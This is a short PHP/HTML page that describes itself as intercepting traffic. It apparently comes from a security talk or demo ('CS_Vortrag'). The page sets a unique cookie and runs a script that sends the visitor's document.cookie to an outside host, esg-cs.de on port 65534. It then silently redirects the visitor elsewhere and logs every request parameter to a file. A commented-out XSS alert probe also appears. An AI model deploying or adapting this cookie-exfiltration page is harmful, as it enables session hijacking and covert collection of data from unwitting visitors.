/* Index Page for intercept traffic creating an unique cookie */
/* by s3t3bo55 */

<?php
	$cookie_value = "CS_Vortrag";
	if(!isset($_COOKIE['uniqueID'])) {
		$expire=time()+60*60;
		setcookie('uniqueID', uniqid(), $expire);
	}
?>
<!DOCTYPE html>
<html>
<body>
<title>Rando</title>
<!--
<img src="fs.png" alt="fsociety">
-->
<script>new Image().src="http://esg-cs.de:65534/cather.php?cookie="+document.cookie;</script>
<meta http-equiv="refresh" content="0; url=https://esg.de/" />
<!---<script>alert(document.cookie)</script>-->
<!--
<br/>
<h> Are we in??? </h>
<br/>
<h> DEFO! </h>
-->

<?php
	$req_dump = print_r($_REQUEST, TRUE);
	$fp = fopen('request.log', 'a');
	fwrite($fp, $req_dump);
	fclose($fp);
?>
</body>
</html>
